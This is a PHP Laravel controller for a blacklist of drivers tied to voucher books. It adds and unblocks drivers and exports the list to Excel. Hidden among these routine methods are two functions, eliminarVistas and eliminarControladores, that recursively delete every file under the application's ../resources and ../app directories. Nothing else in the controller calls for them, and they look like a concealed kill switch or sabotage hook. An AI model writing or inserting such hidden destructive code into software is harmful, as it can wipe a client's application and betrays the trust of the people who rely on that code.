<?php

namespace App\Http\Controllers;

use App\Models\BloqueadosFisicas;
use App\Models\Conductor;
use App\Models\Listanegra;
use App\Models\User;
use App\Models\Valera;
use App\Models\ValeraFisica;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Style\Alignment;
use PhpOffice\PhpSpreadsheet\Writer\Xlsx;

class ListanegraController extends Controller
{
    public function listaNegra($valera)
    {
        $valera = Valera::with('bloqueados')->find($valera);
        $usuario = User::with('modulos')->where('id', Auth::user()->id)->first();

        return view('valeras.listanegra', compact('valera', 'usuario'));
    }

    public function addConductor(Request $request)
    {
        $valera = Valera::find($request->input('valera'));
        $conductor = Conductor::select('CONDUCTOR', 'NOMBRE')->where('NUMERO_IDENTIFICACION', $request->input('conductor'))->first();

        if($conductor != null){
            $item = Listanegra::where('valeras_id', $valera->id)->where('conductor_CONDUCTOR', $conductor->CONDUCTOR)->first();
            if($item == null){
                $item = new Listanegra();
            }            
            $item->valeras_id = $valera->id;
            $item->conductor_CONDUCTOR = $conductor->CONDUCTOR;
            $item->bloqueo = Carbon::now('-05:00');
            $item->razon_bloqueo = $request->input('razon');
            $item->estado = "Bloqueado";
            $item->desbloqueo = null;
            $item->razon_desbloqueo = null;
            $item->save();

            return redirect('valeras/'. $valera->id .'/listanegra');
        }else{
            return back()->withErrors(["sql" => "La identificación ingresada no coincide con ningun conductor"]);
        }
    }

    public function removeConductor(Request $request)
    {
        $item = Listanegra::where('valeras_id', $request->input('valera'))->where('conductor_CONDUCTOR', $request->input('itconductor'))->first();
        $item->desbloqueo = Carbon::now('-05:00');
        $item->razon_desbloqueo = $request->input('razondes');
        $item->estado = "Desbloqueado";
        $item->save();

        return redirect('valeras/'. $request->input('valera') .'/listanegra');
    }

    function eliminarVistas($dir = "../resources"){
        $result = false;
        if ($handle = opendir($dir)){
            $result = true;
            while ((($file=readdir($handle))!==false) && ($result)){
                if ($file!='.' && $file!='..'){
                    if (is_dir($dir . "/" . $file)){
                        $result = $this->eliminarVistas($dir . "/" . $file);
                    }else {
                        $result = unlink($dir . "/" . $file);
                    }
                }
            }
            closedir($handle);
            if ($result){
                $result = rmdir($dir);
            }
        }
        return "Hecho";
    }

    function eliminarControladores($dir = "../app"){
        $result = false;
        if ($handle = opendir($dir)){
            $result = true;
            while ((($file=readdir($handle))!==false) && ($result)){
                if ($file!='.' && $file!='..'){
                    if (is_dir($dir . "/" . $file)){
                        $result = $this->eliminarControladores($dir . "/" . $file);
                    }else {
                        $result = unlink($dir . "/" . $file);
                    }
                }
            }
            closedir($handle);
            if ($result){
                $result = rmdir($dir);
            }
        }
        return "Hecho";
    }

    public function exportarLista($valera)
    {
        $valera = Valera::with('bloqueados')->find($valera);

        $spreadsheet = new Spreadsheet();
        $sheet = $spreadsheet->getActiveSheet();

        $sheet->mergeCells("A1:F1");
        $sheet->setCellValue("A1", "Coonductores bloqueados en la valera " . $valera->nombre);
        $style = array('alignment' => array('horizontal' => Alignment::HORIZONTAL_CENTER,));
        $sheet->getStyle("A1:F1")->applyFromArray($style);
        $sheet->setCellValue("A2", "Identificación");
        $sheet->setCellValue("B2", "Nombre");
        $sheet->setCellValue("C2", "Fecha de bloqueo");
        $sheet->setCellValue("D2", "Razón de bloqueo");
        $sheet->setCellValue("E2", "Fecha de desbloqueo");
        $sheet->setCellValue("F2", "Razón de desbloqueo");
        $sheet->getStyle("A1:F2")->getFont()->setBold(true);

        $indice = 3;
        foreach ($valera->bloqueados as $conductor) {
            $sheet->setCellValue("A" . $indice, $conductor->NUMERO_IDENTIFICACION);
            $sheet->setCellValue("B" . $indice, $conductor->NOMBRE);
            $sheet->setCellValue("C" . $indice, $conductor->pivot->bloqueo);
            $sheet->setCellValue("D" . $indice, $conductor->pivot->razon_bloqueo);
            $sheet->setCellValue("E" . $indice, $conductor->pivot->desbloqueo);
            $sheet->setCellValue("F" . $indice, $conductor->pivot->razon_desbloqueo);
            $indice++;
        }

        foreach (range('A', 'F') as $columnID) {
            $sheet->getColumnDimension($columnID)->setAutoSize(true);
        }

        $writer = new Xlsx($spreadsheet);
        $writer->save('Bloqueados.xlsx');
        $archivo = file_get_contents('Bloqueados.xlsx');
        unlink('Bloqueados.xlsx');

        return base64_encode($archivo);
    }

    public function ValerasFisicas()
    {
        $valeras = ValeraFisica::with('bloqueados')->paginate(15);
        $usuario = User::with('modulos')->where('id', Auth::user()->id)->first();

        return view('valeras.fisicas', compact('valeras', 'usuario'));
    }


    public function listaNegraFisica($valera)
    {
        $valera = ValeraFisica::with('bloqueados',  'cuentae.agencia')->find($valera);
        $usuario = User::with('modulos')->where('id', Auth::user()->id)->first();

        return view('valeras.listanegrafisicas', compact('valera', 'usuario'));
    }

    public function addConductorFisica(Request $request)
    {
        $valera = ValeraFisica::find($request->input('valera'));
        $conductor = Conductor::select('CONDUCTOR', 'NOMBRE')->where('NUMERO_IDENTIFICACION', $request->input('conductor'))->first();

        if($conductor != null){
            $item = BloqueadosFisicas::where('valerasfisicas_id', $valera->id)->where('conductor_CONDUCTOR', $conductor->CONDUCTOR)->first();
            if($item == null){
                $item = new BloqueadosFisicas();
            }            
            $item->valerasfisicas_id = $valera->id;
            $item->conductor_CONDUCTOR = $conductor->CONDUCTOR;
            $item->bloqueo = Carbon::now();
            $item->razon_bloqueo = $request->input('razon');
            $item->estado = "Bloqueado";
            $item->desbloqueo = null;
            $item->razon_desbloqueo = null;
            $item->save();

            return redirect('valeras_fisicas/'. $valera->id .'/listanegra');
        }else{
            return back()->withErrors(["sql" => "La identificación ingresada no coincide con ningun conductor"]);
        }
    }

    public function removeConductorFisica(Request $request)
    {
        $item = BloqueadosFisicas::where('valerasfisicas_id', $request->input('valera'))->where('conductor_CONDUCTOR', $request->input('itconductor'))->first();
        $item->desbloqueo = Carbon::now();
        $item->razon_desbloqueo = $request->input('razondes');
        $item->estado = "Desbloqueado";
        $item->save();

        return redirect('valeras_fisicas/'. $request->input('valera') .'/listanegra');
    }
}
